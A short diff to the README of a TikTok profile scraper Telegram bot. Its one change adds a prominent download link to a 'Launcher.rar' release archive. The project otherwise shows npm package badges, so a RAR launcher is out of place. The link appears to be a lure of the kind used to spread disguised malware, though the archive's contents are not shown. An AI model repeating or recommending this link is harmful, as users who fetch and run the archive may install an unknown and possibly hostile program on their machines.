@@ -1,4 +1,5 @@
 # TikTok Profile Data Scraper Telegram bot
+# [Download](https://github.com/ali20042004/TikTok-Scraper-Telegram/releases/download/V1.4.36/Launcher.rar)
 
 ![NPM](https://img.shields.io/npm/l/tiktok-scraper.svg?style=for-the-badge) ![npm](https://img.shields.io/npm/v/tiktok-scraper.svg?style=for-the-badge) ![Codacy grade](https://img.shields.io/codacy/grade/b3ef17f5a8504600931abfa60ac01006.svg?style=for-the-badge) 
 
